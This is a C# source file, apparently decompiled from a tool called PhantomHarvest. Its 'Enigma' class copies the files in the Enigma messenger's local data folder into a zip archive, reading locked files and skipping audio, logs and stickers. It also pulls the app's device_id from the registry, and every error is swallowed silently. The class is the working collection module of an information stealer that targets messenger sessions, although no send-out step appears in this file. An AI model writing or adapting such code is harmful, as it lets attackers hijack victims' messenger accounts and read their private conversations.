using System;
using System.IO;
using Microsoft.Win32;
using System.Text;
using PhantomHarvest.Helper;

namespace PhantomHarvest.Messengers
{
	// Token: 0x02000014 RID: 20
	internal class Enigma
	{
		public static void Collect(ArchiveManager zip)
		{
			try
			{
				if (Directory.Exists(Enigma.MessengerPath))
				{
					foreach (string text2 in Directory.GetDirectories(Enigma.MessengerPath))
					{
						if (!text2.Contains("audio") && !text2.Contains("log") && !text2.Contains("sticker") && !text2.Contains("emoji"))
						{
							string dirName = new DirectoryInfo(text2).Name;
							string[] files = Directory.GetFiles(text2, "*", SearchOption.AllDirectories);
							foreach (string file in files)
							{
								try
								{
									byte[] fileBytes = LockedFile.ReadLockedFile(file);
									if (fileBytes != null)
									{
										string relativePath = file.Substring(text2.Length);
										if (relativePath.StartsWith("\\") || relativePath.StartsWith("/"))
										{
											relativePath = relativePath.Substring(1);
										}
										string entryName = Enigma.MessengerName + "/" + dirName + "/" + relativePath.Replace("\\", "/");
										
										using (MemoryStream ms = new MemoryStream(fileBytes))
										{
											zip.AddStream(ArchiveManager.Compression.Deflate, entryName, ms, DateTime.Now, "");
										}
									}
								}
								catch {}
							}
						}
					}
					
					try
					{
						object val = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Enigma\\Enigma").GetValue("device_id");
						if (val != null)
						{
							string contents = val.ToString();
							using (MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(contents)))
							{
								zip.AddStream(ArchiveManager.Compression.Deflate, Enigma.MessengerName + "/device_id.txt", ms, DateTime.Now, "");
							}
						}
					}
					catch {}
				}
			}
			catch
			{
			}
		}

		public static string MessengerName = "Enigma";

		public static string MessengerPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Enigma\\Enigma");
	}
}
